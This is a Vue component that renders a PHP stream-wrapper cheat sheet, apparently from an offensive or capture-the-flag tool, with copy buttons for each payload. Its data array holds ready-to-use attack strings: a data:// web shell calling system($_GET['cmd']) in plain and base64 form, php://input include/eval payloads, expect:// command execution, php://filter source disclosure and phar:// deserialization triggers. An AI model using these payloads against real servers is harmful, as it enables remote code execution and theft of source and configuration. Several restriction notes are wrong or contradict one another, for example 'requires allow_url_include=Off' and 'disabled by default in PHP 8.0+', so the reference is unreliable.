<template>
  <div class="modal-overlay" @click.self="store.showWrapperRef = false">
    <div class="modal wrapper-modal">
      <div class="modal-header">
        <h2>PHP Stream Wrappers Reference</h2>
        <button @click="store.showWrapperRef = false" class="btn-close">✕</button>
      </div>

      <div class="wrapper-tabs">
        <button
          v-for="wrapper in wrappers"
          :key="wrapper.id"
          :class="['wrapper-tab', { active: activeWrapper === wrapper.id }]"
          @click="activeWrapper = wrapper.id"
        >
          {{ wrapper.name }}
        </button>
      </div>

      <div class="wrapper-content">
        <div v-for="wrapper in wrappers" :key="wrapper.id" v-show="activeWrapper === wrapper.id">
          <h3>{{ wrapper.name }}</h3>
          <p class="wrapper-description">{{ wrapper.description }}</p>

          <div class="wrapper-section">
            <h4>Syntax</h4>
            <pre class="code-block">{{ wrapper.syntax }}</pre>
            <button @click="copyText(wrapper.syntax)" class="btn-copy">Copy</button>
          </div>

          <div class="wrapper-section">
            <h4>Use Cases</h4>
            <ul>
              <li v-for="(useCase, index) in wrapper.useCases" :key="index">{{ useCase }}</li>
            </ul>
          </div>

          <div class="wrapper-section">
            <h4>Example Payloads</h4>
            <div v-for="(example, index) in wrapper.examples" :key="index" class="example-item">
              <div class="example-label">{{ example.label }}</div>
              <pre class="code-block">{{ example.code }}</pre>
              <button @click="copyText(example.code)" class="btn-copy">Copy</button>
            </div>
          </div>

          <div v-if="wrapper.restrictions" class="wrapper-section">
            <h4>Restrictions</h4>
            <p class="warning">{{ wrapper.restrictions }}</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref } from 'vue'
import { useAppStore } from '../stores/app'

const store = useAppStore()
const activeWrapper = ref('php-filter')

const wrappers = [
  {
    id: 'php-filter',
    name: 'php://filter',
    description: 'Read/write filter for file operations, commonly used for LFI exploitation',
    syntax: 'php://filter/convert.base64-encode/resource=file.php',
    useCases: [
      'Read PHP source code without execution',
      'Bypass file extension checks',
      'Chain multiple filters for obfuscation'
    ],
    examples: [
      {
        label: 'Base64 encode source',
        code: 'php://filter/convert.base64-encode/resource=index.php'
      },
      {
        label: 'ROT13 encoding',
        code: 'php://filter/read=string.rot13/resource=config.php'
      },
      {
        label: 'Chain filters',
        code: 'php://filter/convert.base64-encode|convert.base64-decode/resource=flag.php'
      }
    ],
    restrictions: 'Requires allow_url_include=Off for remote files'
  },
  {
    id: 'phar',
    name: 'phar://',
    description: 'PHP Archive wrapper, exploitable for deserialization attacks',
    syntax: 'phar://archive.phar/file.txt',
    useCases: [
      'Trigger unserialize() via file operations',
      'Bypass disable_functions with POP chains',
      'Exploit file upload + file_get_contents'
    ],
    examples: [
      {
        label: 'Basic phar deserialization',
        code: 'phar://upload.jpg/test.txt'
      },
      {
        label: 'With file_exists',
        code: 'file_exists("phar://evil.jpg")'
      },
      {
        label: 'ZIP wrapper alternative',
        code: 'phar://archive.zip/payload'
      }
    ],
    restrictions: 'Disabled by default in PHP 8.0+'
  },
  {
    id: 'data',
    name: 'data://',
    description: 'Data URI scheme for inline data',
    syntax: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7',
    useCases: [
      'Execute arbitrary PHP code',
      'Bypass file extension filters',
      'Include remote code without allow_url_include'
    ],
    examples: [
      {
        label: 'Plain text PHP',
        code: 'data://text/plain,<?php system($_GET[\'cmd\']);?>'
      },
      {
        label: 'Base64 encoded',
        code: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='
      },
      {
        label: 'With include',
        code: 'include("data://text/plain,<?php phpinfo();?>")'
      }
    ],
    restrictions: 'Requires allow_url_include=On'
  },
  {
    id: 'expect',
    name: 'expect://',
    description: 'Execute system commands via expect extension',
    syntax: 'expect://command',
    useCases: [
      'Direct command execution',
      'Bypass disable_functions',
      'Alternative to system/exec'
    ],
    examples: [
      {
        label: 'Execute command',
        code: 'expect://id'
      },
      {
        label: 'With file_get_contents',
        code: 'file_get_contents("expect://whoami")'
      }
    ],
    restrictions: 'Requires expect extension (rarely enabled)'
  },
  {
    id: 'zip',
    name: 'zip://',
    description: 'Access files inside ZIP archives',
    syntax: 'zip://archive.zip#file.txt',
    useCases: [
      'Read files from uploaded archives',
      'Bypass file type restrictions',
      'Similar to phar:// exploitation'
    ],
    examples: [
      {
        label: 'Read from ZIP',
        code: 'zip://upload.zip#shell.php'
      },
      {
        label: 'Absolute path',
        code: 'zip:///var/www/uploads/file.zip#payload.txt'
      }
    ],
    restrictions: 'Requires zip extension'
  },
  {
    id: 'php-input',
    name: 'php://input',
    description: 'Read raw POST data',
    syntax: 'php://input',
    useCases: [
      'Include POST data as PHP code',
      'Bypass file upload restrictions',
      'Execute code without file write'
    ],
    examples: [
      {
        label: 'Include POST data',
        code: 'include("php://input")\n// POST: <?php system($_GET[\'cmd\']);?>'
      },
      {
        label: 'With file_get_contents',
        code: 'eval(file_get_contents("php://input"))'
      }
    ],
    restrictions: 'Requires allow_url_include=On for include()'
  }
]

function copyText(text) {
  navigator.clipboard.writeText(text)
}
</script>

<style scoped>
.wrapper-modal {
  width: 900px;
  max-width: 90vw;
  max-height: 90vh;
  display: flex;
  flex-direction: column;
}

.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}

.modal-header h2 {
  font-size: 20px;
  color: var(--ctp-text);
  margin: 0;
}

.btn-close {
  background: none;
  border: none;
  color: var(--ctp-text);
  font-size: 24px;
  cursor: pointer;
  padding: 0;
  line-height: 1;
}

.wrapper-tabs {
  display: flex;
  gap: 8px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.wrapper-tab {
  padding: 8px 16px;
  background: var(--ctp-surface0);
  border: 2px solid var(--ctp-surface2);
  color: var(--ctp-text);
  border-radius: 6px;
  cursor: pointer;
  font-size: 14px;
  font-weight: 600;
  transition: all 0.2s;
}

.wrapper-tab:hover {
  background: var(--ctp-surface1);
}

.wrapper-tab.active {
  background: var(--ctp-blue);
  color: var(--ctp-crust);
  border-color: var(--ctp-blue);
}

.wrapper-content {
  flex: 1;
  overflow-y: auto;
}

.wrapper-content h3 {
  font-size: 20px;
  color: var(--ctp-text);
  margin-bottom: 8px;
}

.wrapper-description {
  color: var(--ctp-subtext0);
  margin-bottom: 20px;
}

.wrapper-section {
  margin-bottom: 24px;
}

.wrapper-section h4 {
  font-size: 16px;
  color: var(--ctp-text);
  margin-bottom: 12px;
}

.wrapper-section ul {
  list-style: disc;
  padding-left: 24px;
  color: var(--ctp-subtext0);
}

.wrapper-section li {
  margin-bottom: 6px;
}

.example-item {
  margin-bottom: 16px;
}

.example-label {
  font-weight: 600;
  color: var(--ctp-text);
  margin-bottom: 8px;
}

.btn-copy {
  margin-top: 8px;
  padding: 4px 12px;
  background: var(--ctp-blue);
  color: var(--ctp-crust);
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-size: 12px;
  font-weight: 600;
}

.warning {
  padding: 12px;
  background: var(--ctp-yellow);
  color: var(--ctp-crust);
  border-radius: 6px;
  font-weight: 600;
}
</style>
